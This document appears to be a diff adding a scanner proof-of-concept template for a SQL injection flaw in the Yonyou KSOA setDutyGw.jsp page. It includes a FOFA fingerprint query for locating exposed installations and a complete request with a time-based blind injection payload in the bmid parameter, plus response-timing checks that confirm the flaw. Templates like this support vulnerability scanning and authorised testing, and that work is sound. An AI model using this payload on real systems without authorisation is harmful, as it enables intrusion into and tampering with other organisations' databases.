@@ -1,0 +1,26 @@
+id: poc-yaml-yongyou-ksoa-setdutygw-jsp-sqli
+info:
+  name: 用友时空KSOA setDutyGw.jsp SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 用友时空KSOA
+  fofa: app="用友-时空KSOA"
+variables:
+  t1: random_int(1,5)
+  t2: t1 * 2 + 2
+requests:
+- method: GET
+  path: /hr_dept_position/setDutyGw.jsp?delduty=1&bmid=11';waitfor+delay+'0:0:{{.t1}}'--+
+  expression: 'status_code == 200 &&
+
+    contains(body,"setDutyGw.jsp") &&
+
+    contains(body,"images_index/productCCERP.jpg") &&
+
+    duration > t1 &&
+
+    duration < t2
+
+    '
+transport: http
